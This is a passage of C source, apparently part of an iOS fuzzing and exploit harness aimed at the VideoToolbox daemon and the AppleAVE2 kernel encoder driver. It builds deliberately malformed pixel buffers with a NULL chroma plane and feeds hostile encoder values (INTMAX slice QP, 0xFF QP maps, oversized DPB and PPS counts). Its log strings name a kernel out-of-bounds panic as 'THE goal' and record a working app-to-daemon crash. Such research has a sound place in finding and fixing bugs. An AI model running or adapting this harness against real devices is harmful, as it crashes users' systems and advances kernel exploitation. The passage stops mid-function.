        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set UserParameterSetsIds=CFArray{%ld x %d} -> %d (v72 PPS-count grind - the count-9 LEGAL EDGE drained x8 + CompleteFrames (v67 OP08/09 cb fires=2 = the 'Forcing the PPS count to 1' path DOUBLE-FIRES - the grind sees if the forced-1 double-queue escalates into a fault); -12900 = count-gated; a PANIC/reboot on the drain = the kernel PPS-table OOB = THE goal)\n",
                pfx, tag, val, (int)val2, (int)propStat);
    if (kind == DS_OPT_PPS_HEVC) {
        long qsm = (val >> 16) & 0xF;
        long cqp = ((val >> 16) & 0x10) ? 16 : 0;
        long usg = ((val >> 16) & 0xF00) >> 8;
        if (propStat != 0 || (int)propStat2 != 0 || (cqp ? (int)g_opt_cqp_stat : 0) != 0 || (usg ? (int)g_opt_usg_stat : 0) != 0)   /* v105 quiet: only on nonzero (a real UPS-ride result) */
            dprintf(STDOUT_FILENO, "%s  I[%s] HEVC UPS UserParameterSetsIds=CFArray{%ld x %d} -> %d | QSM-bit=%ld -> %d | CQP=%ld -> %d | Usage=%ld -> %d\n",
                    pfx, tag, (long)(val & 0xFF), (int)ds_pps_hevc_cnt, (int)propStat, qsm, (int)propStat2, cqp, cqp ? (int)g_opt_cqp_stat : -999, usg, usg ? (int)g_opt_usg_stat : -999);
    }
    if (val2 & 0x8000)
        dprintf(STDOUT_FILENO, "%s  I[%s] v96 STR25-SPEC MCTFStrengthLevel=0x%lx create-dict (-> dump words 4-5 @0x8b4/0x8b8)\n", pfx, tag, (long)((val2 >> 24) & 0xFF));
    if (val2 & 0x10000)
        dprintf(STDOUT_FILENO, "%s  I[%s] v96 STR25-SPEC INTMAX create-dict (RAW-INTMAX delivery probe: LANDED = the kext-strength OOB candidate; 'out of range' = setter-gated reject)\n", pfx, tag);
    if (val2 & 0x40000)
        dprintf(STDOUT_FILENO, "%s  I[%s] v96 MCTFParams create-dict x32 (sess+0x8c8 -> daemon 'MCTF Params' log = the receipt; the kext 0x8c8 element-copy = the OOB candidate)\n", pfx, tag);

    if (kind == DS_OPT_USAGE_BOOL)
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set EncoderUsage=%ld -> %d | EnableWeightedPrediction=%s -> %d (v72 usage shot - the v68 run FULLY MAPPED the usage gate: 2 StillImage / 3 FastSource / 4 Streaming ALL -12900 'kVTCompressionPropertyKey_Usage N not supportd' = DEAD at the plugin, ONLY usage 1 VideoProcessing is accepted (and it faults the USL process path - 'AVE_UC_Process:471 / AVE_USL_Drv_Process:1573 fail to process -1015' -> cb -17691); 0 here = this usage rides (usage 0 = the explicit default - expect the 'usage is default' FIG, warning-only); -12900 = the usage gate holds; -2003 = wrong CF type; a PANIC/reboot = THE 64747 kernel OOB)\n",
                pfx, tag, val2, (int)propStat, val ? "TRUE" : "FALSE", (int)propStat2);
    if (kind == DS_OPT_USAGE_GRIND)
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set EncoderUsage=%ld -> %d | EnableWeightedPrediction=%s -> %d (v72 usage-compound grind - 0/0 = both ride the marshal into the x8-frame grind + CompleteFrames (the weighted-pred machinery in the PROCESS path - the v67 usage-1 -1015 USL fault grinded; does it escalate on the drain?); a PANIC/reboot on the drain = THE 64747 kernel OOB)\n",
                pfx, tag, val2, (int)propStat, val ? "TRUE" : "FALSE", (int)propStat2);
    if (kind == DS_OPT_USAGE_GRIND24)
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set EncoderUsage=%ld -> %d | EnableWeightedPrediction=%s -> %d (v72 usage-compound grind24 - the x24 DEEP drain of the -1015 USL-process fault path (v67 usage-1 delivered the compound = 0/0; the per-frame -1015 error is the receipt - does the USL fault escalate / PANIC on the deep drain?); a PANIC/reboot on the drain = THE 64747 kernel OOB)\n",
                pfx, tag, val2, (int)propStat, val ? "TRUE" : "FALSE", (int)propStat2);
    if (kind == DS_OPT_QP_MIX)
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set MinAllowedFrameQP=%ld -> %d | SoftMinQuantizationParameter=%ld -> %d (v72 QP-mix shot - v68 OP13 ANSWERED the split: {MinAllowed=-1, SoftMin=0} = 0/0 then -12902 'Incorrect BlkQPRange [-1 48]' = MinAllowed feeds a SEPARATE validator (BlkQPRange) from SoftMin's (RCQPRange - the v67 {0,-12} = 'Incorrect RCQPRange [-12 48]') = each hostile field is gated by its OWN validator at Prepare, no cross-rescue (the angle FULLY CLOSED); -2004 on either = the formula gate held)\n",
                pfx, tag, val, (int)propStat, val2, (int)propStat2);
    if (kind == DS_OPT_USAGE_COMP) {
        const char *kcomp = ds_opt_pub_key((int)val2);
        char vdesc[64];
        if (val & 0x100) snprintf(vdesc, sizeof(vdesc), "CFBoolean{TRUE}");
        else if (val & 0x200) snprintf(vdesc, sizeof(vdesc), "CFBoolean{FALSE}");
        else snprintf(vdesc, sizeof(vdesc), "%ld", val);
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set EncoderUsage=1 -> %d | %s=%s -> %d (v73 usage-compound shot - the KILLER+SEI COMPOUND: the mode-0 420v8b-64 killer input (bit 12) + DebugMetadataSEI=CFBoolean{TRUE} (bit 8, the v71-proven CFBoolean TYPE) riding the SAME session. v71 OP11's verdict was never established (window-contaminated); on a clean daemon: does the SEI-manager slot change the NULL-row crash site/timing (a different .ips symbol = the SEI machinery interleaves with the blitter) or die identically (vt_Copy_420v_Crop @0x0 = the NULL plane dominates)?; 0/0 = both props rode; -2003 = still type-rejected; -2004 = value-gated; a PANIC/reboot = THE 64747 kernel OOB)\n",
                pfx, tag, (int)propStat, kcomp ? kcomp : "?", vdesc, (int)propStat2);
    }
    if (kind == DS_OPT_USAGE_VAR) {
        int vf = (int)(val & 0xF);
        long uv = (val & 0x100) ? 0 : 1;
        const char *vname = (vf == 1 || vf == 4 || vf == 6 || (vf >= 7 && vf <= 11)) ? "420v8b" : (vf == 2 || vf == 5) ? "420v10" : "2vuy";
        int vsz = (vf == 3 || vf == 4 || vf == 5) ? 256 : (vf == 6) ? 32 : 64;
        const char *vcon = (vf == 7) ? "planar" : (vf == 8) ? "iosurf" : (vf == 9) ? "sess64" : (vf == 10 || vf == 12) ? "trim" : (vf == 11) ? "lbox" : "bytes";
        char vfull[64];
        snprintf(vfull, sizeof(vfull), "%s-%d-%s", vname, vsz, vcon);
        dprintf(STDOUT_FILENO, "%s  I[%s] AVE prop set EncoderUsage=%ld -> %d | scale=%s(%d) (v73 usage-var shot - %s: the v72 run (00:48) CRASHED THE DAEMON 12 TIMES; the pb census ANSWERED the discriminator: mode-0 (CreateWithBytes) buffers report planes=0 p1=(nil) CLIENT-side on EVERY cell (the NULL-plane oracle) while planar-bytes (planes=2, p0/p1 valid) + IOSurface (planes=2, valid) build correctly = the NULL src-row the daemon's vt_Copy_420v_Crop memmoves from is OUR missing-plane construction = a LEGAL-API sandbox-app -> daemon NULL-memmove DoS (CVPixelBufferCreateWithBytes(biplanar) + VTCompressionSession = public APIs; NOT a real-app reach - AVFoundation uses IOSurface = safe; NOT a kernel OOB). usage-0 does NOT rescue (v72 OP12 died = the format alone kills). The v72 Trim/Letterbox levers were NO-OPS (the direct ScalingMode set = -12900 = not in the session supported list) - v73 re-arms them via the census-listed 'PixelTransferProperties' sub-dict: scale=dict(0) = the chain geometry actually changes (the lever question becomes answerable); -12900 = unarmable on iOS = the geometry question closes by API limitation. -12912 + a launchd death = that construction still kills; -17691 no death = fault-but-no-kill; a PANIC/reboot = THE 64747 goal)\n",
                pfx, tag, uv, (int)propStat, scaleMode ? "dict" : "none", scaleStat, vfull);
    }
    ds_epoch_bump(pfx, tag);
    CVPixelBufferRef pb = NULL;
    uint8_t *backing = NULL;
    uint8_t *backing2 = NULL;   /* v72: the planar-bytes UV plane (freed in the cleanup tail) */
    {
        /* v48: byte-backed 2vuy - the ONLY input class that reaches the encoder (v47
         * SW07 5952^2: ok=1 bytes=6948). The per-frame options (ReferenceL0, NaluType,
         * TemporalID, LTR, AttachDPB, ResetRCState) finally ride a real frame into the
         * AVE gates - the AppleAVE2 kernel target. Sane session = HW AVE. */
        int inSize = 64, inH = 64;
        if (kind == DS_OPT_PPS_HEVC && (val2 & 0x20000000)) { inSize = sessW; inH = sessH; }   /* v98: matched 4K input - no scale chain */
        OSType inFmt = kCVPixelFormatType_422YpCbCr8;
        int bMode = 0;   /* v72: 0 = CreateWithBytes, 1 = CreateWithPlanarBytes (explicit 2 planes), 2 = IOSurface-backed */
        size_t bpr, len;
        if (kind == DS_OPT_USAGE_VAR || (kind == DS_OPT_USAGE_COMP && (val & 0x1000))) {
            /* v72: the construction-variant grid - the v71 run (00:12, 11 daemon
             * deaths; .ips 001212 pid 432 + 001253 pid 485 BOTH 'vt_Copy_420v_Crop ->
             * memmove' fault at 0x0) proved the 420-family input kills at ANY tested
             * size. The NULL is a src-row pointer inside the daemon's pixel-transfer
             * blitter. v72 DISCRIMINATES the NULL's source: variants 7/8 rebuild the
             * killer input correctly (planar-bytes / IOSurface) - clean = our
             * CreateWithBytes biplanar layout was the malformed half; 9 = session@
             * input-size (no transfer chain); 10/11/12 = scaling-mode levers. */
            int vf = (int)(val & 0xF);
            if (vf == 1 || vf == 4 || vf == 6 || (vf >= 7 && vf <= 11)) inFmt = kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange;
            else if (vf == 2 || vf == 5) inFmt = kCVPixelFormatType_420YpCbCr10BiPlanarVideoRange;
            if (vf == 3 || vf == 4 || vf == 5) inSize = 256;
            else if (vf == 6) inSize = 32;
            if (vf == 7) bMode = 1;
            else if (vf == 8) bMode = 2;
        }
        if (kind == DS_OPT_MCTF_FMT) {
            /* v81: the MATCHED-SIZE NO-TRANSFER MCTF input - mf 1 = 2vuy, 2 = TRUE
             * 10-bit x420, 3 = 420v 8-bit, 4 = x420 IOSURFACE-backed (the real-app
             * plane delivery - the v80 OP08 byte-backed x420 CRASHED the daemon
             * blitter on a NULL UV plane inside the 64->1920 SCALE transfer). ALL
             * v81 MCTF cells feed the input at the SESSION size (1920x1080 - the
             * scale chain is GONE) and the post-create AllowPixelTransfer=false
             * sends the buffer STRAIGHT to AVE_ImgBuf_Verify. */
            long mf = val & 0xF;
            inFmt = ds_opt_mctf_fmt(mf);   /* v82: the full DevCap table */
            bMode = 2;   /* v83: IOSURF for EVERY mf - v81/v82 only IOSURF'd mf 4+ so 2vuy/x420/420v were always byte-backed = the -12218 dead-end = 420v-IOSURF never fired */
            inSize = sessW;           /* matched size - kills the scale-transfer dimension */
            inH = sessH;              /* v81 rect-fix: v81 v1 fed a SQUARE 1920x1920
                                        * buffer into the 1920x1080 session = the transfer chain
                                        * stayed ALIVE (the NULL-p1 blitter class could still fire);
                                        * a matched 1920x1080 input + NO-TX kills it completely */
        }
        if (inFmt == kCVPixelFormatType_422YpCbCr8) {
            bpr = (size_t)inSize * 2;
            len = (size_t)inSize * inH * 2;
        } else if (kind == DS_OPT_MCTF_FMT && (((val & 0xF) == 2 || (val & 0xF) == 4 || (val & 0xF) == 6 || (val & 0xF) == 7 || (val & 0xF) == 8 || (val & 0xF) == 11 || (val & 0xF) == 12))) {
            bpr = (size_t)inSize * 2;      /* 10-bit 420/422 plane-0 stride */
            len = (size_t)inSize * inH * 5 / 2;
        } else {
            bpr = (size_t)inSize;
            len = (size_t)inSize * inH * 3 / 2;
        }
        CVReturn cr = -1;
        if (bMode == 2) {
            /* IOSurface-backed - the real-app path (AVFoundation/camera buffers are
             * IOSurface-backed 420v; CVPixelBufferCreate + the IOSurface key = CV
             * allocates the surface, planes CV-managed). A daemon 0x0 crash here =
             * ANY app feeding a small 420v IOSurface into a big session kills it. */
            CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFMutableDictionaryRef iosProps = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            if (attrs && iosProps) {
                CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosProps);
                cr = CVPixelBufferCreate(NULL, (size_t)inSize, (size_t)inH, inFmt, attrs, &pb);
            }
            if (attrs) CFRelease(attrs);
            if (iosProps) CFRelease(iosProps);
        } else if (bMode == 1) {
            /* CreateWithPlanarBytes - the CORRECT 2-plane construction (explicit Y +
             * UV plane bases). If the daemon still faults at 0x0, the NULL row is NOT
             * our buffer layout - it is the marshaled buffer the daemon-side blitter
             * walks = a genuine VideoToolbox bug. */
            size_t uvLen = (size_t)inSize * (size_t)inH / 2;
            backing = malloc(len);
            backing2 = malloc(uvLen);
            if (backing && backing2) {
                memset(backing, 0x41, len);
                memset(backing2, 0x41, uvLen);
                size_t pw[2] = { (size_t)inSize, (size_t)inSize / 2 };
                size_t ph[2] = { (size_t)inH, (size_t)inH / 2 };
                size_t pbpr[2] = { (size_t)inSize, (size_t)inSize };
                void *pbase[2] = { backing, backing2 };
                cr = CVPixelBufferCreateWithPlanarBytes(NULL, (size_t)inSize, (size_t)inH, inFmt,
                                                        NULL, 0, 2, pbase, pw, ph, pbpr,
                                                        NULL, NULL, NULL, &pb);
            }
        } else {
            backing = malloc(len);
            if (backing) {
                memset(backing, 0x41, len);
                cr = CVPixelBufferCreateWithBytes(NULL, inSize, inH, inFmt,
                                                  backing, bpr, NULL, NULL, NULL, &pb);
            }
        }
        if (cr != 0 || !pb) {
            /* the OP04/05 discriminator receipt: a silent return would make a
             * no-death cell indistinguishable from 'buffer never created' */
            dprintf(STDOUT_FILENO, "%s  I[%s] input create FAILED (mode %d cr=%d) - cell aborted\n",
                    pfx, tag, bMode, (int)cr);
            if (backing) free(backing);
            if (backing2) free(backing2);
            VTCompressionSessionInvalidate(sess); CFRelease(sess);
            ds_journal_write("DONE", tag);
            return;
        }
        /* v72: the CLIENT-SIDE PLANE CENSUS - the NULL-plane oracle. If plane 1's base
         * is already NULL here, our biplanar construction IS the malformed half (the
         * daemon then memmoves from NULL - a sandbox-app -> daemon DoS, harness-caused);
         * if plane 1 is VALID here and the daemon still faults at 0x0, the NULL appears
         * in the marshal/daemon-side buffer = a genuine VideoToolbox bug. */
        if (inFmt != kCVPixelFormatType_422YpCbCr8) {
            /* lock first - IOSurface-backed buffers return NULL plane bases until
             * locked, which would fake a 'malformed' reading on the OP05 path */
            CVPixelBufferLockBaseAddress(pb, 0);
            dprintf(STDOUT_FILENO, "%s  I[%s] pb census: planes=%zu p0=%p bpr0=%zu | p1=%p bpr1=%zu (mode %d fmt=0x%x)\n",
                    pfx, tag,
                    CVPixelBufferGetPlaneCount(pb),
                    CVPixelBufferGetBaseAddressOfPlane(pb, 0), CVPixelBufferGetBytesPerRowOfPlane(pb, 0),
                    CVPixelBufferGetBaseAddressOfPlane(pb, 1), CVPixelBufferGetBytesPerRowOfPlane(pb, 1),
                    bMode, (unsigned int)inFmt);
            CVPixelBufferUnlockBaseAddress(pb, 0);
        }
    }
    /* v58: DPBRequirements AFTER a warm-up frame - the pcVCP-gate shot. The v57 daemon
     * log proved the pre-encode set reaches the AVE plugin
     * ('AVE_Prop_AVC_SetDPBRequirements:5574 psINS->pcVCP != __null | fail to get VCP'
     * -> -1015 -> -17691) but is gated because pcVCP (the compression protocol) is null
     * before the first frame. A warm-up encode makes pcVCP live, so the hostile
     * num_frames finally rides into the DPB alloc path (kernel 2..17 gate /
     * DPBAllocateRVRABuffers). */
    int dpbAfter = -999;
    if (kind == DS_OPT_DPB_REQ_AFTER) {
        g_ave_fp_on = 0;                 /* the warm-up must not pollute the hostile fp */
        g_ave_cb_err = 0;
        int wbase = g_ave_cb_fires;      /* delta-wait: the global counter is already >0 from prior cells */
        int esw = -999;
        int frw = ds_ave_guard_run(^int {
            OSStatus a = VTCompressionSessionPrepareToEncodeFrames(sess);
            if (a != 0) return (int)a;
            return (int)VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(0, 600),
                                                        CMTimeMake(1, 600), NULL, NULL, NULL);
        }, &esw);
        int es2w = -999;
        if (frw == 0) {
            ds_ave_guard_run(^int { return (int)VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid); }, &es2w);
            for (int i = 0; i < 150; i++) { usleep(200000); if (g_ave_cb_fires - wbase > 0) break; }
        }
        if (frw != 0) {
            /* a faulted warm-up leaves the session in unknown state - never let it
             * masquerade as a gate verdict. Abort the cell (receipts stay clean). */
            dprintf(STDOUT_FILENO, "%s  I[%s] warm-up FAULTED (sig %d) - cell aborted\n", pfx, tag, frw);
            CVBufferRelease(pb);
            if (backing) free(backing);
            if (backing2) free(backing2);
            VTCompressionSessionInvalidate(sess); CFRelease(sess);
            ds_journal_write("DONE", tag);
            usleep(300000);
            return;
        }
        dprintf(STDOUT_FILENO, "%s  I[%s] warm-up encode fr=%d flush=%d (pcVCP should be live now)\n", pfx, tag, frw, es2w);
        CFMutableDictionaryRef req = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(req, CFSTR("num_frames"), nf);
        CFRelease(nf);
        dpbAfter = (int)VTSessionSetProperty(sess, CFSTR("DPBRequirements"), req);
        CFRelease(req);
        if (dpbAfter == 0)
            dprintf(STDOUT_FILENO, "%s  I[%s] DPB set AFTER warm-up = 0 -> GATE PASSED - num_frames=%ld rides to the DPB alloc (PANIC = THE goal)\n", pfx, tag, val);
        else
            dprintf(STDOUT_FILENO, "%s  I[%s] DPB set AFTER warm-up = %d -> still gated (pcVCP or client reject)\n", pfx, tag, dpbAfter);
    }
    /* build the frame-properties dict for the per-frame options */
    CFMutableDictionaryRef fp = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFNumberRef nv = NULL;
    CFMutableArrayRef arr = NULL;
    if (kind == DS_OPT_REFL0) {
        /* AVE_kVTEncoderFrameOptionKey_ReferenceL0 = CFArray of frame numbers */
        arr = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        /* v57: NEVER build an attacker-length array - INTMAX here was the v56
         * 19:03:44 client suicide (2.1B CFNumbers = OOM SIGSEGV, zero evidence).
         * The kernel iNum<=9 gate makes 16 the hostile OOB count; cap hard. */
        long cap = (val > 16) ? 16 : val;
        for (long i = 0; i < cap; i++) {
            long v = i;
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v);
            CFArrayAppendValue(arr, nf);
            CFRelease(nf);
        }
        CFDictionarySetValue(fp, CFSTR("AVE_kVTEncoderFrameOptionKey_ReferenceL0"), arr);
    } else if (kind == DS_OPT_NALUTYPE) {
        nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(fp, CFSTR("AVE_kVTEncoderFrameOptionKey_NaluType"), nv);
    } else if (kind == DS_OPT_TEMPORALID) {
        nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(fp, CFSTR("AVE_kVTEncoderFrameOptionKey_TemporalID"), nv);
    } else if (kind == DS_OPT_LTRREPLACE) {
        nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(fp, CFSTR("AVE_kVTEncoderFrameOptionKey_FrameNumForLTRToReplace"), nv);
    } else if (kind == DS_OPT_ATTACHDPB) {
        nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(fp, CFSTR("AVE_kVTEncodeFrameOptionKey_AttachDPB"), nv);
    } else if (kind == DS_OPT_RESETRC) {
        nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(fp, CFSTR("AVE_kVTEncodeFrameOptionKey_ResetRCState"), nv);
    } else if (kind == DS_OPT_SETDPB_NUM) {
        /* v59: the PUBLIC kVTEncodeFrameOptionKey_SetDPB - the daemon's FIG getter
         * prints 'kVTEncodeFrameOptionKey_SetDPB found (%d)'. The AVE_-private keys of
         * v57/v58 NEVER produced a FIG: line in the daemon log = stripped client-side. */
        nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_SetDPB"), nv);
    } else if (kind == DS_OPT_SETDPB_ARR) {
        /* array shape - feeds the daemon's 'UserDPBFrames CFArrayGetValueAtIndex' gate */
        arr = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        long cap = (val2 > 32) ? 32 : val2;      /* bounded - no client balloon */
        for (long i = 0; i < cap; i++) {
            long v = val;
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v);
            CFArrayAppendValue(arr, nf);
            CFRelease(nf);
        }
        CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_SetDPB"), arr);
    } else if (kind == DS_OPT_SLICEQP) {
        /* the daemon indexes this per slice (its log prints an index per entry) */
        arr = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        long cap = (val2 > 128) ? 128 : val2;    /* bounded - no client balloon */
        for (long i = 0; i < cap; i++) {
            long v = val;
            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &v);
            CFArrayAppendValue(arr, nf);
            CFRelease(nf);
        }
        CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_SliceQP"), arr);
    } else if (kind == DS_OPT_PPSID) {
        nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_PicParameterSetId"), nv);
    } else if (kind == DS_OPT_VRA_PUB) {
        /* the SM dims via the PUBLIC name - SM02-04 used it and were stream-inert, but
         * the FIG-line delivery oracle was never correlated, so delivery is unproven */
        CFMutableDictionaryRef dims = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val2);
        CFDictionarySetValue(dims, CFSTR("Width"), nw);
        CFDictionarySetValue(dims, CFSTR("Height"), nh);
        CFRelease(nw); CFRelease(nh);
        CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_VRAUsedDimension"), dims);
        CFRelease(dims);
    } else if (kind == DS_OPT_NONREF) {
        nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_RequestNonReferenceFrame"), nv);
    } else if (kind == DS_OPT_FINAL) {
        nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_FinalFrame"), nv);
    } else if (kind == DS_OPT_REFRESH) {
        nv = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &val);
        CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_ForceRefresh"), nv);
    }
    /* v97: the FRAMEOPTIONS OPEN-GATE arms (kind PPS_HEVC only - the AVC twin is
     * val2 & 0x4000). The frameProperties dict is the daemon per-frame options
     * channel (DS_OPT_SLICEQP PROVED the kVTEncodeFrameOptionKey_* keys forward -
     * FIG lines; the 19:56 v96 run PROVED the transport kernel-side: OP85 AVC =
     * ok=1 ACCEPT fp=000001a7... = map + SQP rode PerFrameData into the kernel AVC
     * encoder). 0x1000000 = kVTEncodeFrameOptionKey_SliceQP={26|INTMAX} - the
     * userSliceQP > THRESH branch of AVE_Client_Enc_Check_Process (THRESH = the
     * -6*(N-8) min-expr ~ -13; 0x4000000 = INTMAX = the widest 32-bit word through
     * the open gate). 0x2000000 = kVTEncodeFrameOptionKey_UserQpMap = CFData
     * (32640B required at 1920x1088 = 8160 MBs x 4B; 0x400000 = 0xFF hostile bytes,
     * 0x800000 = 32639 short oracle, 0x8000000 = LAST-4B 0xFFFFFFFF mark,
     * 0x10000000 = FIRST-4B 0xFFFFFFFF mark). The bare "UserQpMap" twin covers a
     * plain-name plugin read (the VT key table). */
    if (kind == DS_OPT_PPS_HEVC && (val2 & 0x1000000)) {
        long sq26 = (val2 & 0x4000000) ? 2147483647L : 26;   /* v97: 0x4000000 = INTMAX userSliceQP - the widest 32-bit word through the open gate */
        CFNumberRef sqn = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &sq26);
        CFMutableArrayRef sqa = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        CFArrayAppendValue(sqa, sqn);
        CFRelease(sqn);
        CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_SliceQP"), sqa);
        CFRelease(sqa);
        dprintf(STDOUT_FILENO, "%s  I[%s] v98 FP-SliceQP {%s} -> frameOptions (kVTEncodeFrameOptionKey_SliceQP = the userSliceQP > -13 gate opener)\n",
                pfx, tag, (val2 & 0x4000000) ? "INTMAX" : "26");
    }
    if (kind == DS_OPT_PPS_HEVC && (val2 & 0x2000000)) {
        int mapPat = (val2 & 0x400000) ? 0xFF : 0x00;
        size_t mapLen = ((size_t)(sessW + 15) / 16) * ((size_t)(sessH + 15) / 16) * 16;  /* v123: x16 - the 18:31 daemon log PROVED required@1080p = 130560 ('UserQpMapSize (32640) does not match required size (130560), disabling userQPMap feature') = 120x68 MBs x 16B (BOTH UserQpMap builders - the OP99 fp path and the v95 pb-attachment path - send to the same kernel gate); the old x4 (32640) was silently disabled every run */
        if (val2 & 0x800000) mapLen -= 1;                          /* the 1-byte-short size oracle (32639 / 147455) */
        uint8_t *mbuf = (uint8_t *)malloc(mapLen);
        if (mbuf) {
            memset(mbuf, mapPat, mapLen);
            if (val2 & 0x8000000) {   /* v97: LAST-4B mark - 0x00 map with 0xFFFFFFFF in the final MB-QP word (the boundary walk discriminator) */
                memset(mbuf, 0x00, mapLen);
                if (mapLen >= 4) {
                    memset(mbuf + mapLen - 4, 0xFF, 4);
                    mapPat = -2;
                }
            } else if (val2 & 0x10000000) {  /* v97: FIRST-4B mark - 0x00 map with 0xFFFFFFFF in MB-QP word 0 (the table-head discriminator) */
                memset(mbuf, 0x00, mapLen);
                if (mapLen >= 4) {
                    memset(mbuf, 0xFF, 4);
                    mapPat = -3;
                }
            }
            CFDataRef mdat = CFDataCreate(kCFAllocatorDefault, mbuf, (CFIndex)mapLen);
            free(mbuf);
            if (mdat) {
                CFDictionarySetValue(fp, CFSTR("kVTEncodeFrameOptionKey_UserQpMap"), mdat);
                CFDictionarySetValue(fp, CFSTR("UserQpMap"), mdat);   /* bare twin - plain-name plugin read */
                dprintf(STDOUT_FILENO, "%s  I[%s] v98 FP-UserQpMap {%s x %zuB} -> frameOptions (kVTEncodeFrameOptionKey_UserQpMap + UserQpMap)\n",
                        pfx, tag, (mapPat == 0xFF) ? "0xFF" : (mapPat == -2) ? "0x00+LAST-4B-0xFF" : (mapPat == -3) ? "0x00+FIRST-4B-0xFF" : "0x00", mapLen);
                CFRelease(mdat);
            }
        }
    }
    if (nv) CFRelease(nv);
    if (arr) CFRelease(arr);
    /* v81 rect-guard: the BYTE-BACKED biplanar cells (mf 2 = x420 10-bit, mf 3 =
     * 420v 8-bit) carry the NULL-p1 shape the 11:06 v80 census PROVED client-side
     * (planes=0 p1=0x0). NO-TX must be LIVE for them - if the AllowPixelTransfer=
     * false set failed (noTX != 0), the same-size transfer chain would re-fire the
     * known vt_Copy_x420_Crop NULL-memmove crash (already collected 3x) instead of
     * testing the MCTF gate. VOID the cell with a receipt instead. */
    if (kind == DS_OPT_MCTF_FMT && ((val & 0xF) == 2 || (val & 0xF) == 3) && ds_mctf_notx_stat != 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] MCTF-FMT: byte-backed biplanar NO-TX FAILED (noTX=%d) - cell VOID (the NULL-p1 shape must NOT hit the transfer chain; the mf4 IOSURF + mf1 2vuy cells carry this test)\n",
                pfx, tag, ds_mctf_notx_stat);
        CFRelease(fp);
        CVBufferRelease(pb);
        if (backing) free(backing);
        if (backing2) free(backing2);
        if (sess) { VTCompressionSessionInvalidate(sess); CFRelease(sess); }
        ds_journal_write("DONE", tag);
        usleep(300000);
        return;
    }
    /* v95: the per-frame UserQpMap attachment - the -13 kernel-gate unlock. 32640 B =
     * the required MB-map size for 1920x1080 (8160 MBs x 4B - the v62 under/exact/one-
     * past probe); 0xFF content = hostile per-MB QP bytes into the kernel MB tables. */
    if (g_opt_qpmap_arm && pb) {
        int mapPat = (val2 & 0x400000) ? 0xFF : 0x00;
        size_t mapLen = ((size_t)(sessW + 15) / 16) * ((size_t)(sessH + 15) / 16) * 16;  /* v123: x16 - the 18:31 daemon log PROVED required@1080p = 130560 ('UserQpMapSize (32640) does not match required size (130560), disabling userQPMap feature') = 120x68 MBs x 16B (BOTH UserQpMap builders - the OP99 fp path and the v95 pb-attachment path - send to the same kernel gate); the old x4 (32640) was silently disabled every run */
        if (val2 & 0x800000) mapLen -= 1;                          /* the 1-byte-short size oracle (32639 / 147455) */
        uint8_t *mbuf = (uint8_t *)malloc(mapLen);
        if (mbuf) {
            memset(mbuf, mapPat, mapLen);
            CFDataRef mdat = CFDataCreate(kCFAllocatorDefault, mbuf, (CFIndex)mapLen);
            free(mbuf);
            if (mdat) {
                CVBufferSetAttachment(pb, CFSTR("UserQpMap"), mdat, kCVAttachmentMode_ShouldPropagate);
